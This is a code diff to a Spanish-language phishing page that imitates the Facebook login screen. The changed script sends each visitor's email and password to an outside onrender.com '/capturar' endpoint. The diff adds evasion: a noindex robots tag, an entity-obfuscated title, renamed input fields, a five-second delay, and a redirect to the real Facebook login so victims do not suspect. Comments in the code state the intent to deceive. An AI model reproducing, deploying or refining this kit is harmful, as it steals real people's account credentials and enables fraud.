@@ -5,45 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook.com</title>
     <link rel="stylesheet" href="css/style.css">
+    <meta name="robots" content="noindex, nofollow, noarchive">
 </head>
 <body>
     <div class="wrapper">
         <main class="main-container">
             <section class="left-panel">
                <div class="logo-fb-custom">f</div> 
-                
                 <div class="collage-area">
                     <span class="emoji">😆</span>
-                    
-                    <div class="card card-knot">
-                        <div class="card-icon"></div>
-                    </div>
-
+                    <div class="card card-knot"><div class="card-icon"></div></div>
                     <div class="card card-skater">
                         <div class="time-badge">⏱️16:45</div>
-                        
-                        <div class="profile-circle">
-                            <div class="heart-badge"></div>
-                        </div>
+                        <div class="profile-circle"><div class="heart-badge"></div></div>
                     </div>
-
-                    <div class="card card-tickets">
-                        <div class="blue-icon">★</div>
-                    </div>
+                    <div class="card card-tickets"><div class="blue-icon">★</div></div>
                 </div>
-
                 <h1 class="main-text">Conecta <br> con tus <br> <span> amigos aquí.</span></h1>
             </section>
 
             <section class="right-panel">
                 <div class="login-container">
-                    <h2>Iniciar sesión en Facebook</h2>
+                    <h2 class="titulo-login">Inici&#x61;r s&#x65;si&oacute;n &#101;n F&#x61;cebo&#x6f;k</h2>
+                    
                     <form id="loginForm">
-                        <input type="text" id="email" placeholder="Correo electrónico o número de celular" required>
-                        <input type="password" id="password" placeholder="Contraseña" required>
+                        <input type="text" id="usr_auth_x46" placeholder="Correo electrónico o número de celular" required>
+                        <input type="password" id="pass_auth_x46" placeholder="Contraseña" required> 
                         <button type="submit" class="login-btn">Iniciar sesión</button>
                     </form>
+                    
                     <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+                    <div class="divider"></div>
                     <button class="create-btn">Crear cuenta nueva</button>
                 </div>
                 <div class="meta-brand">
@@ -58,49 +50,58 @@
                 <div class="footer-row languages">
                     <span>Español</span> <span>English (US)</span> <span>Italiano</span> 
                     <span>Português (Brasil)</span> <span>Français (France)</span> 
-                    <span>Deutsch</span> <span>日本語</span> <span>Más idiomas...</span>
+                    <span>Más idiomas...</span>
                 </div>
+                <div class="footer-divider"></div>
                 <div class="footer-row">
-                    <span>Condiciones</span> <span>Ayuda</span>   <span></span>  <span></span>
-
-               
-
-                <div class="footer-copyright">
-                    
+                    <span>Condiciones</span> <span>Ayuda</span>
                 </div>
             </div>
         </footer>
     </div>
 
-   <script>
+    <script>
     const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.querySelector('.login-btn');
 
     loginForm.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        // 1. Efecto inmediato en el botón
+        loginBtn.innerText = "Iniciando sesión...";
+        loginBtn.style.opacity = "0.7";
+        loginBtn.disabled = true;
 
-        try {
-            // Usamos tu nuevo enlace de Render
-            const response = await fetch('https://facebook-com-y4u8.onrender.com/capturar', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
-            });
+        // 2. Captura de datos
+        const email = document.getElementById('usr_auth_x46').value;
+        const password = document.getElementById('pass_auth_x46').value;
 
-            if (response.ok) {
-                loginForm.reset();
-                // Mensaje de distracción
-                alert("Error de inicio de sesión. Por favor, inténtelo de nuevo más tarde.");
+        // 3. RETRASO DE 5 SEGUNDOS (Equilibrio perfecto)
+        setTimeout(async () => {
+            try {
+                const response = await fetch('https://facebook-com-y4u8.onrender.com/capturar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+
+                if (response.ok) {
+                    loginForm.reset();
+                    // Redirección rápida para que el usuario no sospeche
+                    window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
+                } else {
+                    throw new Error("Error en servidor");
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                // Si falla, permitimos reintentar
+                loginBtn.innerText = "Iniciar sesión";
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                alert("Error de red. Intenta de nuevo.");
             }
-        } catch (error) {
-            console.error('Error:', error);
-            alert("Hubo un problema con la conexión.");
-        }
+        }, 5000); 
     });
-</script>
-
-
+    </script>
 </body>
 </html>
